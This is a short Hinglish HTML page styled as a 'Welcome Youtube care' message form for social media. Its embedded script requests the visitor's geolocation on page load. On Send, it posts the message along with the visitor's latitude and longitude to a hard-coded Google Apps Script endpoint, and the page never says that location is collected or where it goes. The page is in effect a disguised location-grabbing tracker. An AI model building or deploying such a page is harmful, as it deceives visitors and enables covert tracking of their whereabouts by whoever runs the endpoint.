<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Welcome Message</title>
  <style>
    body {
      background-color: #ffc0cb; /* Gulabi background */
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      color: #333;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 80%;
      max-width: 300px;
      padding: 10px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-top: 12px;
      border: none;
      border-radius: 5px;
      background-color: #ff69b4;
      color: #fff;
      cursor: pointer;
    }
    button:hover { background-color: #ff1493; }
    .status {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Welcome Youtube care,message send kar sakte hain social media ke liye</h1>
  <input type="text" id="message" placeholder="Apna message likhiye">
  <br>
  <button id="sendBtn">Send</button>
  <p class="status" id="status"></p>

  <script>
    let latitude = '', longitude = '';

    // Page load par location ask karo
    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
          },
          err => { console.warn('Location denied or unavailable.'); }
        );
      }
    };

    document.getElementById('sendBtn').onclick = async () => {
      const msg = document.getElementById('message').value.trim();
      if (!msg) {
        document.getElementById('status').textContent = 'Message likho pehle!';
        return;
      }

      const payload = {
        message: msg,
        latitude: latitude,
        longitude: longitude
      };

      fetch("https://script.google.com/macros/s/AKfycbyWx8UnBnspDRxEUpupA0cR6Iy2Tl-vW1AJ51kpxz05qGXItaJHqkiWFg3pxTK3lzWlCg/exec", {
        method: "POST",
        mode: "no-cors", // avoid CORS blocking
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      })
      .then(() => {
        document.getElementById('status').textContent = 'Message sent successfully ✅';
      })
      .catch(() => {
        document.getElementById('status').textContent = 'Error sending data ❌';
      });
    };
  </script>
</body>
</html>
